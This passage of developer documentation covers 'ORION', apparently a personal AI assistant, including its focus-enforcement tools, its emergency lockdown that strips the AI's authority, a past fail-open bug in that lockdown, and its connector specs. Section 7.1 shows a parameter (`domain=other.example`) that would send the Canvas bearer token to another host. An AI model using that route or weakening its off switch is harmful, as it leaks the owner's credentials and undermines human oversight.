  a build or test running, someone at the door, a call he has to take, feeling
  ill, an actual emergency.
- Refuse boredom, restlessness, "just five minutes", "I'll make it up later",
  wanting to check something, and anything that is just not wanting to.
- Grant no more than 15 minutes, and less if the reason implies less.
- He has already been granted <n> exception(s). Be harder
  each time.
- You are his assistant, not his boss. Be short and human, never preachy.
```

  Sent with `curl -s -m 180 http://127.0.0.1:11434/api/generate` (Ollama, `stream:false`) through `/bin/sh` and `python3` to extract `response`; the last non-empty line is the verdict. If the model cannot be reached the **answer is no** (`:470-472`: "A broken model must not be the way out of a lockdown"). A `GRANT <n> <reason>` (n clamped 1..15) appends a grant `{until, reason, argument}` and **resets strikes to 0**; anything else is `DENIED`, exit 1.
- **Calls out to** `/usr/bin/shortcuts run "Orion Focus On"|"Orion Focus Off"` (the only supported way to toggle a macOS Focus mode; missing shortcut is reported, the session starts anyway, `:97-120`), `open -a`, `lsappinfo`, `git`, `orion-agenda`, local Ollama.
- **History** `d9cf665` 2026-08-11 (toolbelt), `e701537`/`3f05780` 2026-09-03 (Phase 60: prepare, `next`, `--repo`, Focus mode shortcut), `e34a9c6` 2026-10-02 (no more `say`), `6eb4dca` 2026-10-06 (retired from ORION's allowlist).
- **Tests** No unit test in `tests/` targets `scripts/orion-focus` itself (the files named `focus-cli.test.mjs` exercise `orion-session`). `scripts/orion_v2_rules_check.py:365` mentions it in a rules text.
- **Gotchas & lessons** (1) The comment "Refocus, don't kill" (`:10-15`) explains the design: bring the task app forward rather than quitting the distraction (quitting loses unsaved work and needs per-app Automation permission); the newer `orion-ontask` ladder *does* have a `quit` rung, gated by consent. (2) A cron calling `check` every minute printed "no active session" 1440 times a day; `scripts/orion-cron-deliver:28-40` was built partly to stop that becoming 1440 Discord messages. (3) State is not locked: `writeFile` of the whole JSON, so a concurrent `check` and `plead` can lose a write.
- **Walk it yourself** `orion-focus status` is read-only; read `scripts/orion-focus:317-403`; compare the Swift `Enforcement.swift:90-100`.
- **Questions to ask your tutor** Why does a failed judge mean "no"? Why decay strikes instead of resetting? Why was this retired when the ladder in 6.1 exists? What does "never a path argument" buy?
- **Extra notes on `orion-focus`** (1) The judge model is `gpt-oss:20b` (`scripts/orion-focus:52`), a different model from the main chat route, a "second opinion" with a hard fail-closed default. (2) The docs disagree about status: `plugin/workspace/AGENTS.md:438` calls it retired and `6eb4dca` took it off the allowlist, but `plugin/workspace/PLAYBOOK.md:84` still says it owns lockdown and `scripts/orion-selfdoc` still describes it. Trust the code and the commit. (3) A per-minute cron once called `check`; its output was filtered by `scripts/orion-cron-deliver` (`--match`, dedup, rate limit) so 1,440 idle lines a day did not become Discord messages, and `scripts/orion_v2_lock_check.sh` still carries a sample cron line named `orion-focus-guard`. (4) Do not run `start`: it opens apps and may run a Shortcut.

---

### 6.7 CLI: `scripts/orion-lock` (the off switch)

- **What it is** ORION's panic button (Manifest Phase 43). It does not lock the screen. It removes ORION's authority: stops remote commands, cancels what is running, withdraws standing approvals, drops the permission profile to the floor `restricted_read_only`, and disables every cron job. It deliberately does **not** kill the gateway: "A dead gateway cannot be asked why it is dead, cannot be unlocked, and takes the voice down with it" (`:22-24`).
- **Where** `scripts/orion-lock` (335 lines). Constants/paths 54-72; helpers 79-117; `status` 119-132; `lock` 134-230; `stopActionsAndGrants` 238-261; `stopTheChannel` 266-303; dispatch 305-335.
- **Contracts** `orion-lock [lock|status|release]`; no argument means `lock`; anything else -> `usage: orion-lock [lock|status|release]`, exit 2. Exit code 1 when any step failed (after attempting all).
- **How `lock` works**, in this order (order is the lesson; see Gotchas):
  1. `stopTheChannel()` (`:266-303`), each write guarded and non-throwing:
     - write `lock.json` = `{locked:true, at, by:"orion-lock", reason}` (the lock flag that remote verbs check and that `SnapshotReader.locked()` reads);
     - cancel the queue: count lines in `inbox.jsonl` and set the cursor in `remote-inbound.json` to that count, so queued envelopes are never handed to a verb (they stay on disk for audit);
     - in `remote.json`, mark every `pending` approval as `expired_by_lock`;
     - set `remote-link.json` to `{state:"offline", connectionId:null, lockedOut:true}` so a reconnect must identify afresh.
  2. `stopActionsAndGrants()` (`:238-261`): for every running action id (matching `/^orion-[a-f0-9]{16}$/` in `actions/running/*.json`) write a file in `actions/cancel/<id>` (asks them to stop); delete every `.json` in `~/.openclaw/orion-gate/approvals/chat` ("chat yes") and `.../grants`. Added after a 2026-09-26 review (findings M4 and H3: a terminal command ran up to two minutes after a lock; an "allow for this chat" outlived the lock by hours; commit `9855d99`).
  3. Read the permission state; if not already `restricted_read_only`, call the **installed** plugin's `changePermissionProfile({requestedProfile: FLOOR, expectedVersion, context, request:{kind:"instruction", trust:"trusted_user", content:"Set the permission profile to restricted_read_only immediately. This is an emergency lockdown."}}, {statePath, auditPath})`. It prefers `~/.openclaw/extensions/orion-control/dist/permissions.js` and falls back to `plugin/orion-control/dist/permissions.js` in the repo. It does not write `permission-state.json` itself, so the append-only audit (`permission-audit.jsonl`) is written first, under the same lock. Result handling: `changed`/`unchanged` are success; `rejected`/`stale`/`needs_approval` print `NOT changed` and set `failed` but do not stop later steps.
  4. List cron jobs via `~/.openclaw/bin/openclaw cron list` (15 s timeout, parse uuid-shaped first column, name = third column) and `openclaw cron disable <id>` each one.
  5. Print a summary with undo instructions and the audit path.
- **`status`** prints profile (+ version), cron job names, and `remote LOCKED since <at>` vs `accepting`.
- **`release`** (`:308-331`) removes only the **remote** lock: requires the owner's confirmation through `lib/orion-reauth.mjs` `reauthenticate("release ORION's emergency lock")` (Touch ID or password; a failed check prints "still locked") then deletes `lock.json`. The profile stays on the floor and the cron jobs stay disabled by design: "undo the emergency should be more work than the emergency was".
- **Side effects** Heavy but all local: writes/removes files listed above, disables cron jobs via the openclaw CLI. **Never run it to explore.** (`status` is the only harmless subcommand; it still shells out to `openclaw cron list`.)
- **Gotchas & lessons**
  1. **It once failed open (found 2026-09-02, fix `0d67b37`).** The remote stop used to come after the permission change, and a comment claimed otherwise. If `changePermissionProfile` returned `stale` (anything else writing the profile during the up-to-15-second `cron list`), the script exited before writing the flag. A corrupt `permission-state.json` threw before anything was touched. The order was inverted and every step made independently guarded.
  2. A first attempt tested for result status `applied`, which never occurs, and would have reported a successful lockdown as failure (`:192-195`).
  3. The lock flag was added 2026-09-02 because "locked" had been inferred from `profile === restricted_read_only`, which is ambiguous once an inbound channel exists (`:56-64`).
  4. Spelling: the shell prompt "lock" word in the ladder (`pmset displaysleepnow`) and this script are unrelated.
- **History** `d9cc23d` 2026-09-01 (first), `0af5235` 2026-09-02 (remote lock flag, queue, leases), `0d67b37` 2026-09-02 (fail-open repair), `ceb6b79` 2026-09-15 (path move into `plugin/`), `9855d99` 2026-09-26 (stop running actions, withdraw grants, re-auth release).
- **Tests** `scripts/orion_v2_lock_check.sh` (sandboxed `HOME`; lock exits 0, audit records `orion-lock` as the requester, release denied without owner and allowed with it, via `ORION_REAUTH_BIN`); `plugin/orion-control/src/self-development-authority.test.ts:37` pins that `scripts/orion-lock` is listed as "LOCK ORION" in the authority table; `scripts/orion-incident` documents it as step one of the incident procedure.
- **Walk it yourself** `sed -n 134,160p scripts/orion-lock` for the new ordering; read `scripts/orion_v2_lock_check.sh:95-120`; **do not run `orion-lock`**.
- **Questions to ask your tutor** Why is the remote stop first and unconditional? Why does unlocking cost more than locking? Why call the plugin's own writer instead of editing the state file? What would "fail open" have looked like for an attacker?

---

### 6.8 CLI: `scripts/orion-phone-time`

- **What it is** Reads and changes the phone's Screen Time app lock from the Mac. The lock itself lives on the phone; the Mac only sees what the phone last reported and can send "extra time" back.
- **Where** `scripts/orion-phone-time` (86 lines): constants 16-26, `describe()` 29-53, commands 55-86.
- **Contracts** Usage: `status` (default), `grant <minutes|HH:MM> --because "<reason>"`, `revoke`. Env: `ORION_CONTROLLED_DIR` (default `~/.openclaw/orion-controlled`), `ORION_HEALTH_LOG` (default `<dir>/health-log.json`), `ORION_NOW` (ISO, test clock). Files: reads `health-log.json` field `phoneScreen` (`{at, locked, until, why: "night"|"work"|"checkin", graceUntil?, usedMinutes?}`), writes/removes `screen-grant.json` (`{id, until, because (<=120 chars), setAt}`; the phone link carries it back, `SnapshotReader.swift:186-188`). Constants `MAX_MINUTES = 60`, `STALE_MINUTES = 15`.
- **How `status` decides what to say** (`describe`, `:29-53`), first match:
  1. No `phoneScreen` at all -> "Unknown: his phone has not reported ...".
  2. `graceUntil` still in the future -> `UNLOCKED on extra time until <time>, then it locks again [until <time>] — as of <time>.`
  3. `locked` and `until` in the future -> `LOCKED: his distracting apps are locked until <time> (past bedtime | during a planned work block | an ignored check-in | focus lock)` plus any extra-time note.
  4. Report older than 15 minutes -> `UNKNOWN NOW: the phone last reported at <time> (N min ago) and was not locked then; it may have locked since ... If he says it is locked, believe him — never tell him it isn't. A grant works either way.`
  5. Else `Not locked — as of <time>.`
  A report older than 30 minutes also gets an `(N min ago)` suffix.
- **`grant`** requires `--because` (non-empty, else usage + exit 2). The amount is either minutes (`^\d{1,3}$`) or `HH:MM` (rolls to tomorrow if already past). `<1` minute -> exit 1 "that time has already passed"; **`> 60` minutes -> exit 1 `NOT GRANTED`** with advice to turn Focus lock off himself in the phone app. Otherwise it writes `screen-grant.json` atomically (tmp + rename). It then prints one of two honest messages: if the phone **has never reported** -> `SENT, NOT CONFIRMED: ...` and tells the caller to say it is sent, not done, and to give the manual route (ORION on the phone -> Focus lock -> off, or iPhone Settings -> Screen Time); otherwise `Sent to his phone: apps unlock until <time> (N min), then lock again by themselves ...`; `status` shows UNLOCKED once the phone confirms via `graceUntil`.
- **`revoke`** deletes `screen-grant.json` and says the lock returns at the phone's next check-in or when the granted time ends.
- **Why it is built this way (incidents)** 2026-10-01: Nick asked "can you pretty please unblock my apps just until 12:45" and ORION said nothing was locked because the lock lives on the phone and the Mac could not see it (`0ee7ea6`, `900bcaa`). Later the same day ORION said "Done — you're unlocked" to a phone whose ORION build was too old to act on a grant (`1801a69`: grants are "sent" until the phone confirms). 2026-10-06: a two-hour-old "not locked" report was spoken as the present and ORION told him his locked phone was free (`2234adf`: reports older than 15 minutes are history, not the answer; never contradict him).
- **Callers** The model, per `plugin/workspace/AGENTS.md:88-100` (status first; when asked to unlock, pick 60 min in the day/evening or 15-20 past bedtime and say when it re-locks; say "unlocked" only if the output says the phone has it); `scripts/orion-quick:43` (live facts) and `scripts/orion-remote:611-613` (injects the lock state and the grant instruction into the phone-chat context); `orion-selfdoc:342`; the front-desk menu (`scripts/eval/v3/front-desk-menu.json:9`).
- **Tests** `tests/phone-time.test.mjs`: the 00:24 message case, honesty when the phone has not reported, grant until 12:45 written for the link, >60 min refused and a reason required, revoke removes the grant, never-reported grant is "sent, not done", stale "not locked" not passed off as now, fresh "not locked" is a plain answer.
- **Side effects** Only `screen-grant.json` (grant/revoke). No message is sent; delivery to the phone is the Link helper's job.
- **Gotchas** `ORION_HEALTH_LOG` overrides only the read path; the grant is always written to `ORION_CONTROLLED_DIR`. The model-facing wording (`SENT, NOT CONFIRMED`, `UNKNOWN NOW`) is written *to the model* as instructions inside tool output.
- **Walk it yourself** `node scripts/orion-phone-time status` (read-only); `node --test tests/phone-time.test.mjs`.
- **Grant delivery and `status` details** `why` codes map `night` to "past bedtime", `work` to "during a planned work block", `checkin` to "an ignored check-in", anything else "focus lock". A grant prints one of two honest lines: if the phone has never reported, `SENT, NOT CONFIRMED: ...` (tells the model not to say he is unlocked and how to unlock himself: ORION on the phone, Focus lock, off, or iPhone Settings, Screen Time); otherwise `Sent to his phone: apps unlock until HH:MM (N min), then lock again by themselves.` (`scripts/orion-phone-time:75-80`). Travel path: the script writes `screen-grant.json`; the Link helper reads it only while `until > now` (`native/OrionLink/Sources/LinkCore/SnapshotReader.swift:185-193`) and hands it to the phone, which sets `orion.screen.graceUntil` (`native/OrionMobile/App/FocusLock.swift:129-148` region); the phone reports `graceUntil` back in its next `phoneScreen`, which flips `status` to UNLOCKED. The script does no minute accounting. Also used by `scripts/orion-selfdoc` and the eval fixtures (`scripts/lib/eval/v3/fixtures.mjs`). History: `0ee7ea6` and `900bcaa` 2026-10-01, `1801a69` 2026-10-01 (unconfirmed grant tells him how to unlock himself), `2234adf` 2026-10-06 (an old "not locked" is no longer said as now).
- **Questions to ask your tutor** Why cap grants at 60 minutes? Why is a 20-minute-old "not locked" reading "unknown now"? What does the phone report before every message and why does a Mac voice turn send nothing?

---

### 6.9 CLI: `scripts/orion-waiting` (approvals, unrelated to the attention waiting store)

- **What it is** A 20-line read-only lister of **approval tickets that are waiting for Nick**. Created 2026-09-29 (`37c29fd`) after ORION answered "no pending approvals" without looking.
- **Where** `scripts/orion-waiting:1-20`.
- **How it works** Directory `~/.openclaw/orion-gate/approvals/`. `grants/*.json` names are the set of already-granted ticket ids. For each `tickets/*.json` that parses, has an `id`, is not in the granted set and whose `expiresAt` is in the future, list it sorted by soonest expiry: `<id> — <action>: <summary up to 160 chars> (expires in N min)`. None -> `Nothing is waiting for Nick's approval.` Footer: `Nick approves with: approve <id>  (from the phone's Control tab, Discord, or the Mac).` It cannot approve anything.
- **Contracts** No flags or arguments (any are ignored). Caller: `plugin/workspace/AGENTS.md:56` ("Approvals -> `orion-waiting`"); `orion-selfdoc:336`. `orion-lock` also deletes `approvals/chat` and `approvals/grants` (6.7), which is why a lock makes this list longer, not shorter, for any outstanding tickets.
- **Output** Either `Nothing is waiting for Nick's approval.` or one line per ticket, then `Nick approves with: approve <id> (from the phone's Control tab, Discord, or the Mac).` `orion-lock` deletes the *grants* directory contents, so a grant does not survive a lock while tickets remain.
- **Tests** none found. **Gotcha** The name collides with the attention `waiting` source (the "waiting on" store with `who/what/expect/dueBy`), which is a different data set (5.12).

---

### 6.10 Section 6 cross-cutting notes

- **Who runs what and when.** Swift `ScheduleFocusWatcher` every 30 s -> `orion-ontask-watch` -> (maybe) `orion-ontask act ...`. The model, on request, calls `orion-ontask status|snooze|allow|wrong|act` and `orion-phone-time`. `orion-lock` is a human terminal command and an item in ORION's authority table. `orion-focus` is retired. `orion-focus-report` and `orion-attention*` are on-demand tools.
- **Consent gates in the ladder.** nudge/say need none; `front`/`quit`/`lock` need `activity.enforcementAllowed` (the app's switch); phone shielding needs the phone's own Focus lock enabled and Screen Time-authorized app lists (`plugin/workspace/AGENTS.md:441`).
- **Rule shared by all of it:** unknown is not safe. Stale activity sample (>90 s) -> do nothing; stale phone sample (>5 min) -> assume zero usage; stale phone lock report (>15 min) -> "unknown now"; unreadable calendar -> refuse to guess; unreadable source in the attention feed -> named outage.
- **Lessons.** (1) One writer per file: the 2026-10-06 incident, where on-task state overwrote the app's session file, produced the `ontask-state.json` split. (2) Minute-of-day arithmetic (ladder, snooze, allow) is simple and testable but has midnight and UTC-vs-local edges **(inferred)**. (3) It is a blocklist: only named apps/titles are off task, plus idle of 5 minutes or more. (4) One rung per tick, one alert per rung, one on-task sample resets everything. (5) Fail closed (`orion-lock` ordering, the plead judge's default deny) and "sent is not done" (`orion-phone-time`). (6) Docs lag code (see the `orion-focus` note in 6.6); `docs/planning/v2/ATTENTION_ENGINE.md` is accurate that the attention engine is not wired.

### 6.11 State and data files on disk (paths only)

All under `~/.openclaw/orion-controlled/` unless noted.

| Path | Written by | Read by | What |
|---|---|---|---|
| `focus-state.json` | Orion.app only | `orion-session status`, app | live focus session |
| `focus-history.jsonl` | Orion.app only | `orion-session today/recover`, `orion-focus-report`, attention focus source | one JSON line per finished session |
| `ontask-state.json` | `orion-ontask`, `orion-ontask-watch` (via `lib/focus/state.mjs`) | same | `{ladder, allow[], log[<=500]}`; env `ORION_FOCUS_STATE` |
| `focus-activity.json` | Orion.app `ScheduleFocusWatcher`, every 30 s | `orion-ontask-watch` (must be under 90 s old) | `{at, app, title, idleSeconds, enforcementAllowed, workApp}` |
| `focus-phone.json` | `orion-ontask-watch` | `native/OrionLink/App/LinkEngine.swift:486` | `{at, until, block[], why}` |
| `alerts-outbox.jsonl` | `orion-ontask-watch`, `orion-watch` | LinkEngine (`:163`), plugin | `{at, kind, text}` rows |
| `health-log.json` | phone link (`TrackingLog.swift`), other trackers | `orion-ontask-watch`, `orion-phone-time` | contains `phoneScreen` and `screenLog` |
| `screen-grant.json` | `orion-phone-time grant` | `SnapshotReader.swift`; `revoke` deletes | `{id, until, because, setAt}` |
| `focus.json` | legacy `orion-focus` | attention `focusActiveFrom` | `{session: null}` at the snapshot |
| `lock.json` | `orion-lock` | `orion-remote`, link, `orion-lock status` | remote-channel lock flag |
| `permission-state.json`, `permission-audit.jsonl` | plugin `permissions.js` (called by `orion-lock`) | plugin, `orion-lock` | profile and append-only audit |
| `remote.json`, `remote-inbound.json`, `remote-link.json`, `inbox.jsonl` | remote bridge; modified by `orion-lock` | bridge | pending approvals, inbox cursor, link session |
| `actions/running/`, `actions/cancel/` | plugin / `orion-lock` | action runner | cancel files by task id |
| `attention.json`, `attention-today.json` | attention CLIs | iPhone link reader | did not exist on this Mac (not live) |
| `~/.openclaw/orion-gate/approvals/{tickets,grants,chat}/` | approval gate | `orion-waiting`; `orion-lock` deletes `grants` and `chat` | tickets and standing yeses |
| `eval-mode` | evaluation tooling | `scripts/lib/eval-mode.mjs` | marker (under 2 h old) that pauses the watcher |


---

## 7. Connectors: Gmail, Canvas, finance, messages

This chapter covers every script that lets ORION reach a service outside the Mac (Gmail, Canvas, TfL, the bank via the app's Plaid link) or an app-local data store that holds other people's words (Messages' `chat.db`), plus `orion-health`, `orion-finance` and `orion-learn`. All paths are relative to the repo root `/Users/nickmadaio/Desktop/ORION` unless stated. Snapshot: branch `orion-v2/backlog-checkpoint`, HEAD `6c93032`, 2026-10-14; worktree dirty (none of the scripts in this chapter are among the uncommitted files that I could see in the snapshot, but re-check with `git status`).

Read `docs/learn/04_plugin_core_actions_gate.md` first for the gate vocabulary used here (tier, profile, approvalRequired, taint check, strictness floor). This chapter only restates the parts that touch these scripts.

### In this section

| # | Component | Kind | Reads or writes |
|---|-----------|------|-----------------|
| 7.1 | Connector spec format and `spec.mjs` | library | pure, no I/O |
| 7.2 | `orion-connect` (list/show/run/create/set/how/canvas-course/canvas-courses) | CLI | network GET (Canvas, TfL, others ORION writes), Keychain read, `~/.openclaw/orion-connectors/*` writes |
| 7.3 | `orion-connect-admin` | CLI (Nick only) | writes the writes-allowed switch file, deletes connector specs |
| 7.4 | Canvas library: `canvas.mjs`, `course-notes.mjs`, `course-vault.mjs` and `orion-brain canvas-*` | library | network GET, then writes Obsidian-style vault notes with backups |
| 7.5 | Gmail: `orion-gog`, `gmail-client.mjs`, `gmail-format.mjs`, `orion-gmail-search`, `orion-gmail-latest` | CLIs + libs | read-only Gmail API via the `gog` CLI |
| 7.6 | `orion-finance` (and the Plaid side in the Swift app) | CLI | reads one local JSON file |
| 7.7 | `orion-health` | CLI | reads one local JSON file |
| 7.8 | `orion-messages` (read) | CLI | reads `chat.db` and AddressBook sqlite files |
| 7.9 | `imessage-typedstream.mjs` | library | pure decoder, byte-level walk |
| 7.10 | `orion-messages-send` (write) and its gates | CLI | sends an iMessage/SMS via AppleScript |
| 7.11 | `orion-learn` | CLI | reads session logs, writes one markdown report |
| 7.12 | Cross-cutting: secrets, gates, what reaches a model | summary | n/a |

---

### 7.1 Connector spec format and `spec.mjs`

- **What it is.** A "connector" is a JSON file, not code. It declares one https host, a set of named GET operations (path template, query template, which response fields to keep, a cap on list length) and how to authenticate (none, bearer, header, or query parameter, with the secret living in the macOS login Keychain, never in the file). ORION can write one for himself after reading an API's docs; Nick's quote at the top of the file: "if he doesn't have it he can create it himself quickly to fulfill my request." `scripts/lib/connect/spec.mjs` is the pure library that validates a spec, fills templates, builds the one request an operation makes, and trims the response. It performs no network and reads no secrets.
- **Where.** `scripts/lib/connect/spec.mjs`: `validateSpec` 14-41, `fill` 44-52, `buildRequest` 55-75, `keepFields` 78-96, `trimArrays` 98-102. Built-in specs: `scripts/connectors/canvas.json` (247 lines, 11 operations) and `scripts/connectors/tfl.json` (38 lines, 5 operations).
- **How it works.**
  1. `validateSpec(spec)` returns an array of human-readable issues; an empty array means valid. Rules (each is a line in `spec.mjs`):
     - `name` must match `/^[a-z][a-z0-9-]{1,31}$/` (line 10, 17).
     - `title` is a non-empty string (18).
     - `baseUrl` must start `https://host` (20); may contain a settings placeholder like `https://{{domain}}`; must not carry `?` or `#` (21).
     - `auth.type` is one of `none|bearer|header|query` (12, 23). If not `none`, `auth.keychain` must match `/^ORION [A-Za-z0-9 ._-]{1,40}$/`, i.e. the Keychain item name must start with the literal `ORION ` (24). `header` needs `auth.header` (a header name, 25); `query` needs `auth.param` (26).
     - A crude secret scan: the JSON text of the whole spec must not match `(key|token|secret|password)=` or `bearer\s+[a-z0-9]` case-insensitively (27).
     - `operations` must have at least one entry (29). Each operation name matches `/^[a-z][a-z0-9_]{1,39}$/` (11, 31); `path` starts with `/` (32) and is not an absolute URL or contains `//` (33); `method` defaults to GET and anything else is refused unless `"write": true` is set (34); `description` required (35).
     - `settings` keys match `/^[a-z][a-zA-Z0-9]{0,30}$/` and each needs a `description` (37-39).
  2. `fill(template, values, {encode})` replaces `{{name}}` (required) and `{{name?}}` (optional, dropped to the empty string if absent) with values. Path values are `encodeURIComponent`-encoded; for `baseUrl` and query templates `encode:false` is used (the query values get percent-encoded later by `URLSearchParams`). It returns the text plus a `missing` list.
  3. `buildRequest(spec, opName, params, settings)` merges `{...settings, ...params}` (line 58; **parameters override settings**, see Gotchas), fills base, path and each query entry, drops query entries that resolved to the empty string, refuses if any required placeholder is missing, builds a `URL`, refuses non-https (70), and checks that the final host equals the host of the filled base URL (71-72). It returns `{method, url, host, write}` or `{error}`.
  4. `keepFields(value, fields, limit=8)` keeps only the listed dotted fields (`"lineStatuses.statusSeverityDescription"` means: for each record, key `lineStatuses`, and inside each element of that array, key `statusSeverityDescription`). Arrays are cut to the first `limit` items at every level. With no `keep` list it only trims arrays.
- **Contracts (the spec JSON shape).**

```json
// scripts/connectors/tfl.json:1-12
{
  "name": "tfl",
  "title": "London transport (TfL)",
  "baseUrl": "https://api.tfl.gov.uk",
  "auth": { "type": "none" },
  "operations": {
    "status": {
      "description": "Whether tube, DLR, Overground and Elizabeth lines are running (all of them)",
      "path": "/Line/Mode/tube,dlr,overground,elizabeth-line/Status",
      "keep": ["name", "lineStatuses.statusSeverityDescription", "lineStatuses.reason"],
      "limit": 20
    },
```

  Top-level keys: `name`, `title`, `baseUrl`, optional `settings` (non-secret values Nick sets with `orion-connect set`, each `{description, required?}`; `required: false` makes a setting optional, `orion-connect:57`), optional `auth` (`type`, `keychain`, `header`, `param`, `howToGet`), `operations`. Per operation: `description`, `path`, optional `query` (object of templates), optional `method` (default GET), optional `write` (true only for non-GET), `keep` (dotted field list), `limit` (list cut; defaults to 8 in `run`, `orion-connect:234`). `orion-connect create` adds a `createdAt` ISO timestamp when it saves a spec (`orion-connect:169`).
- **TfL operations** (`scripts/connectors/tfl.json`, no auth, host `api.tfl.gov.uk`): `status` (GET `/Line/Mode/tube,dlr,overground,elizabeth-line/Status`, limit 20); `line` (GET `/Line/{{line}}/Status`); `journey` (GET `/Journey/JourneyResults/{{from}}/to/{{to}}` with optional `time`, `timeIs`, `date` query params, limit 3); `stop_search` (GET `/StopPoint/Search/{{query}}`, limit 5); `arrivals` (GET `/StopPoint/{{id}}/Arrivals`, limit 8). Nick is in London for university (AGENTS.md routes "when should I leave", "is the tube running" to `orion-connect run tfl ...`, `plugin/workspace/AGENTS.md:195-196`).
- **Canvas operations** (`scripts/connectors/canvas.json`): base `https://{{domain}}` with one required setting `domain` ("the Canvas address he logs into, e.g. northeastern.instructure.com", lines 5-9), auth `bearer` with Keychain item `ORION Canvas` (10-14; `howToGet`: Canvas, Account, Settings, + New Access Token). Operations (line, path, notable query, `limit`):

| Op | Path | Query / params | Keeps (summary) | limit |
|----|------|----------------|-----------------|-------|
| `courses` (16) | `/api/v1/courses` | `enrollment_state=active`, `per_page=100` | id, name, course_code, time_zone, enrollments.type | 100 |
| `upcoming` (32) | `/api/v1/users/self/upcoming_events` | none | title, start_at, assignment.due_at, points, context_name, html_url | 15 |
| `todo` (45) | `/api/v1/users/self/todo` | none | assignment.name, due_at, context_name, html_url | 15 |
| `assignments` (56) | `/api/v1/courses/{{course_id}}/assignments` | `order_by=due_at`, `per_page=100` | 20 fields incl. description, due_at, unlock_at, lock_at, submission_types, quiz_id, locked_for_user | 100 |
| `grades` (88) | `/api/v1/users/self/enrollments` | `type[]=StudentEnrollment`, `state[]=active` | course_id, grades.current_score, grades.current_grade | 20 |
| `announcements` (102) | `/api/v1/announcements` | `context_codes[]=course_{{course_id}}`, `per_page=10` | title, posted_at, message | 5 |
| `course` (116) | `/api/v1/courses/{{course_id}}` | `include[]=syllabus_body` | id, name, course_code, time_zone, syllabus_body, apply_assignment_group_weights, dates | 100 |
| `assignment` (137) | `/api/v1/courses/{{course_id}}/assignments/{{assignment_id}}` | none | same 20 fields as `assignments` | 100 |
| `quizzes` (165) | `/api/v1/courses/{{course_id}}/quizzes` | `per_page=100` | quiz metadata only (time_limit, question_count, scoring_policy, lockdown flags); description says "never quiz questions or attempts" | 100 |
| `quiz` (200) | `/api/v1/courses/{{course_id}}/quizzes/{{quiz_id}}` | none | same quiz metadata | 100 |
| `assignment_groups` (232) | `/api/v1/courses/{{course_id}}/assignment_groups` | `per_page=100` | id, name, group_weight, rules | 100 |

  The deliberate limit: no submissions, no quiz attempts, no questions, no per-assignment grade details. Only the `grades` operation returns scores (course-level `current_score` / `current_grade`).
- **Calls out to.** Nothing (pure). The runner `orion-connect` makes the HTTP request.
- **History.** `c2eda84` 2026-09-30 "feat(remote): truthful replies, eval harness and connectors" created `spec.mjs`, `tfl.json`, `canvas.json` (first version), `orion-connect`, `orion-connect-admin`. `320626f` 2026-10-06 "feat(school): retrieve Canvas course facts and refresh linked brain notes" widened `canvas.json` (added `course`, `assignment`, `quizzes`, `quiz`, `assignment_groups`, more `keep` fields) and added the Canvas library (7.4).
- **Gotchas & lessons.**
  - The header comment of `spec.mjs` promises "a spec can never reach another host, send a secret anywhere but its own host". The code enforces that the *path* cannot leave the base host (`spec.mjs:33`, `71-72`), but two things loosen it **(read from code; not exercised in `tests/connect.test.mjs`)**:
    1. `buildRequest` lets run-time params override settings (`{...settings, ...params}`, line 58) and the base URL is filled from that merged object. So `orion-connect run canvas courses domain=other.example` would build `https://other.example/api/v1/courses`, the host check compares against that same filled base so it passes, and the Canvas bearer token is attached to the request. Likewise `orion-connect set canvas domain=...` (7.2) accepts any value for `domain`.
    2. `validateSpec` only checks that `auth.keychain` *looks like* `ORION <something>`. It does not tie a Keychain item to a host. A spec ORION creates with `baseUrl` on some other host and `"keychain": "ORION Canvas"` would send the Canvas token to that host. The guard against this today is process (ORION's instruction text, and Nick reviewing), not code.
  - `{{x?}}` optional placeholders are how `journey` gets `time`, `timeIs`, `date` without requiring them.
  - `keepFields` silently drops fields not present (`if (!(head in node)) continue`, line 90), so a typo in a `keep` list gives an empty object rather than an error.
  - `validateSpec` is called again by `run` (`orion-connect:211`) so a hand-edited spec in `~/.openclaw/orion-connectors/` is revalidated each use.
- **Walk it yourself.**
  1. `sed -n 14,41p scripts/lib/connect/spec.mjs`, then try to name which line rejects `http://x.com`, which rejects a path of `//evil`.
  2. `sed -n 55,75p scripts/lib/connect/spec.mjs` and trace `buildRequest(tflSpec, "journey", {from:"EC3N 1AF", to:"E14"}, {})` by hand: where do `time`, `timeIs`, `date` go?
  3. `node --test tests/connect.test.mjs` (pure; the CLI test uses a temp `ORION_CONNECTORS_DIR`, it does not call the network: `run canvas courses` stops at "not set up yet").
- **Questions to ask your tutor.**
  1. Why make connectors data (JSON) rather than code ORION writes? What attack does that remove, and what does it leave (see the two loosenings above)?
  2. Walk `keepFields` over a TfL `status` response and show the shape of the output.
  3. Where is the line between "read operation" and "write operation" in this system, and why can a write operation not carry a request body today?
  4. How would you close the param-override-host hole in `buildRequest` and the keychain-item/host mismatch in `validateSpec`?
  5. Why is the Keychain item prefix `ORION ` enforced?

---

### 7.2 `orion-connect`

- **What it is.** A 240-line Node CLI (`scripts/orion-connect`, `#!/usr/bin/env node`). It is the single place a connector's secret is read and the single place connector HTTP requests are made. It also reports whether every "connection" ORION has (calendar, Reminders, Messages, Gmail, WHOOP, bank, iPhone link, Discord, voice) works right now. Model-facing instruction: `plugin/workspace/AGENTS.md:187-204`. Called by ORION through `exec` (allowlisted wrapper; see `plugin/orion-control/src/exec-routing.ts` for the wrapper list context) and by `scripts/orion-brain` for Canvas (7.4).
- **Where.** Constants and helpers 19-65; `systemStatus` 67-96; `help` 98; `list` 100-111; `how` 113-128; `show` 130-141; `set` 143-155; `create` 157-173; `canvas-course(s)` 175-205; `run` 207-238; usage fallback 240.
- **How it works.** Subcommands, each with arguments and effects:

| Subcommand | Args | Effect | Reads | Writes | Network |
|-----------|------|--------|-------|--------|---------|
| (none) or `help` | none | prints the header comment (line 98) | the script itself | none | none |
| `list` | none | prints "Built-in connections" (live status rows from `systemStatus`) then "Connectors" (each spec: `ready: ops` or `NEEDS: ...`) | specs, `settings.json`, Keychain (existence check), many app files | none | **yes**: calls `orion-gmail-latest` (a real Gmail read), the Mac bridge (calendar and Reminders reads), `launchctl list` |
| `show <name>` | connector name | prints title, what it still needs, and each operation as `name(params) - description [WRITE]` | spec, settings, Keychain | none | none |
| `run <name> <op> [k=v ...]` | connector, operation, params (`k=v`, split at first `=`) | builds the request, checks write gate, attaches secret, GETs, trims with `keep`/`limit`, prints JSON | spec, settings, `writes-allowed.json`, Keychain | none | one HTTPS request to the connector's host |
| `create <name> --json '<spec>'` or `--file <path>` | name plus spec | validates and writes `~/.openclaw/orion-connectors/<name>.json` (mode 0600) | spec input | the spec file | none |
